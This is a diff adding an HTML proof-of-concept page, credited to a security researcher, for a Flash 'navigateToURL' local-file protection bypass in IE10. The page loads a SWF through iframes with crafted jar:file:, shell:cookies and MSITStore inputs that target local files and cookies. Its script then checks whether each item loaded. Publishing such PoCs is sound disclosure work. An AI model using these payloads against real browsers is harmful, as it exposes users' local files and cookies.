@@ -1,0 +1,106 @@
+<html>
+    <head>
+        <!-->
+        <style type="text/css">
+            #div1 {width:350px;height:70px;padding:10px;border:1px solid #aaaaaa;}
+            </style>
+        <-->
+    </head>
+    <body>
+        PoC has written by Soroush Dalili (@irsdl) <br/>
+        Flash "navigateToURL" local-with-filesystem protection bypass - tested in IE10<br/>
+        <a href="http://secproject.com">SecProject.com</a>
+        <br/>
+
+        IFrames: </br>
+        <iframe name="main1" id="main1" src="" width=800 height=600 draggable="true" ondragstart="drag(event)"></iframe>
+        <!--
+        <iframe name="main2" id="main2" src="" width=800 height=600  draggable="true" ondragstart="drag(event)"></iframe>
+
+        <div id="div1" ondrop="drop(event)"
+        ondragover="allowDrop(event)"></div>
+
+        </br></br>
+        Target IFrame:
+        <select name="targetiframe" id="targetiframe">
+        	<option value="1">Iframe 1</option>
+        	<option value="2">Iframe 2</option>
+        </select>
+
+        <br/>
+        Options:
+        <select name="targetlist" id="targetlist" onchange='window.document.getElementById("customaddress").value=window.document.getElementById("targetlist").value'>
+        	<option value="link_protocol_test.swf?input=jar:file:/c:\">link_protocol_test.swf?input=jar:file:/c:\</option>
+    	    <option value="link_protocol_test.swf?input=jar:file:/c:\windows\Starter.xml">link_protocol_test.swf?input=jar:file:/c:\windows\Starter.xml</option>
+    	    <option value="link_protocol_test.swf?input=jar:file:/c:\secret.txt">link_protocol_test.swf?input=jar:file:/c:\secret.txt</option>
+	        <option value="link_protocol_test.swf?input=jar:shell:cookies">link_protocol_test.swf?input=jar:shell:cookies</option>
+        	<option value="link_protocol_test.swf?input=jar:mk:@MSITStore:C:\Windows\Help\mui\0409\certmgr.CHM::/html/355962c2-4f6b-4cbd-ab00-6e7ee4dddc16.htm">link_protocol_test.swf?input=jar:mk:@MSITStore:C:\Windows\Help\mui\0409\certmgr.CHM::/html/355962c2-4f6b-4cbd-ab00-6e7ee4dddc16.htm</option>
+	        <option value="link_protocol_test.swf?input=\\/c:/">link_protocol_test.swf?input=\\/c:/</option>	
+        </select>
+        <input type=button value="Change the location" onclick='doIT(window.document.getElementById("targetlist").value,window.document.getElementById("targetiframe").value)' />
+        <br/> -->
+        Or a Custom Address:
+        <input type=text id=customaddress name=customaddress value="link_protocol_test.swf?input=" size=100/>
+
+        <input type=button value="Change Location to this address!" onclick='doIT(window.document.getElementById("customaddress").value, 1)' />
+        <!--
+        <br/><br/>
+        <input type=button value="Was item available???" onclick='showIframeContent(window.document.getElementById("targetiframe").value)' />
+        -->
+        <script>
+            var status=1;
+
+            //window.document.getElementById('firstSite').value = window.document.getElementById('main').src;
+            window.onbeforeunload = function(e) {
+            	//
+            };
+
+            function showIframeContent(targetframe){
+            	var result = 0;
+            	try{
+                    var temp = window.document.getElementById('main'+targetframe
+                        ).contentWindow.document.body.innerHTML;
+            	}catch(e){
+	    	        if(e.message.indexOf('Access')==-1)
+    	          		result=1;
+	            }
+        	    if(result)
+	        	    alert('Yes! Item has been loaded successfully!');
+    	        else
+	    	        alert('No! Invalid Item!');
+            }
+
+            function doIT(myValue,targetframe){
+                window.document.getElementById('main'+targetframe).src = myValue;
+            }
+
+            function checkStatus(obj){
+        	    // disbaled for now
+    	        //alert(history.length)
+            }
+
+            function checkErr(){
+	            alert(/error_in_iframe/)
+            }
+        </script>
+        <script>
+            function allowDrop(ev){
+                ev.preventDefault();
+            }
+
+            function drag(ev){
+                ev.dataTransfer.setData("Text",ev.target.id);
+            }
+
+            function drop(ev){
+                ev.preventDefault();
+                var data=ev.dataTransfer.getData("Text");
+                alert(data);
+                ev.target.appendChild(document.getElementById(data));
+            }
+        </script>
+        <script>
+            //doIT('link_protocol_test.swf?input=\\/c:/',1, function(){showIframeContent(1);});
+        </script>
+    </body>
+</html>
